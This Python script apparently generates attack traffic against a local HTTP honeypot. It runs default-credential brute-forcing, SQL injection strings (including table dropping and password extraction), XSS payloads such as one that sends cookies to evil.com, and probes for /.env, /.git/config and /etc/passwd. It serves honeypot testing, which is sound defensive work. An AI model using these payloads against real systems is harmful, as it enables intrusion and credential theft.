"""
HTTP Attack Simulation
Sends realistic attack payloads to the HTTP honeypot:
  - Login brute-force
  - SQL injection
  - XSS injection
  - Directory scanning / path traversal
"""

from __future__ import annotations

import argparse
import time
import urllib.error
import urllib.parse
import urllib.request


BASE = "http://127.0.0.1:{port}"


# ── helpers ─────────────────────────────────────────────────────────────────

def _post(url: str, data: dict) -> int:
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=payload, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=3) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except (urllib.error.URLError, OSError):
        return 0


def _get(url: str) -> int:
    try:
        with urllib.request.urlopen(url, timeout=3) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except (urllib.error.URLError, OSError):
        return 0


# ── attack scenarios ─────────────────────────────────────────────────────────

def sim_login_bruteforce(base: str, delay: float) -> None:
    print("[SIM-HTTP] Login brute-force...")
    creds = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("root", "root"), ("root", "toor"), ("user", "user"),
        ("test", "test123"), ("administrator", "admin"),
        ("admin", "letmein"), ("admin", "qwerty"),
    ]
    for user, pwd in creds:
        code = _post(f"{base}/login", {"username": user, "password": pwd})
        print(f"  POST /login {user}:{pwd} → {code}")
        time.sleep(delay)


def sim_sql_injection(base: str, delay: float) -> None:
    print("[SIM-HTTP] SQL injection attempts...")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "' OR 'a'='a",
        "1' AND SLEEP(5)--",
        "' OR 1=1#",
    ]
    for p in payloads:
        # Try in login form
        code = _post(f"{base}/login", {"username": p, "password": "anything"})
        print(f"  POST /login SQLi payload → {code}")
        # Try in search
        q = urllib.parse.quote(p)
        code = _get(f"{base}/search?q={q}")
        print(f"  GET  /search?q={q[:30]}... → {code}")
        time.sleep(delay)


def sim_xss(base: str, delay: float) -> None:
    print("[SIM-HTTP] XSS attempts...")
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert('xss')>",
        '"><script>document.location="http://evil.com?c="+document.cookie</script>',
    ]
    for p in payloads:
        q = urllib.parse.quote(p)
        code = _get(f"{base}/search?q={q}")
        print(f"  GET  /search XSS → {code}")
        time.sleep(delay)


def sim_directory_scan(base: str, delay: float) -> None:
    print("[SIM-HTTP] Directory scanning...")
    paths = [
        "/admin",
        "/admin/config",
        "/.env",
        "/.git/config",
        "/wp-admin",
        "/phpmyadmin",
        "/etc/passwd",
        "/../../../etc/passwd",
        "/config.php",
        "/web.config",
        "/backup",
        "/api/admin",
        "/dashboard",
        "/.htaccess",
        "/robots.txt",
        "/server-status",
    ]
    for path in paths:
        code = _get(f"{base}{path}")
        print(f"  GET {path} → {code}")
        time.sleep(delay)


# ── combined runner ─────────────────────────────────────────────────────────

def simulate_http_attacks(host: str = "127.0.0.1", port: int = 8080, delay: float = 0.25) -> None:
    base = f"http://{host}:{port}"
    print(f"[SIM-HTTP] Starting HTTP attack simulation → {base}")

    sim_login_bruteforce(base, delay)
    time.sleep(0.5)
    sim_sql_injection(base, delay)
    time.sleep(0.5)
    sim_xss(base, delay)
    time.sleep(0.5)
    sim_directory_scan(base, delay)

    print("[SIM-HTTP] Done.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP attack simulation")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--delay", type=float, default=0.25)
    args = parser.parse_args()
    simulate_http_attacks(host=args.host, port=args.port, delay=args.delay)
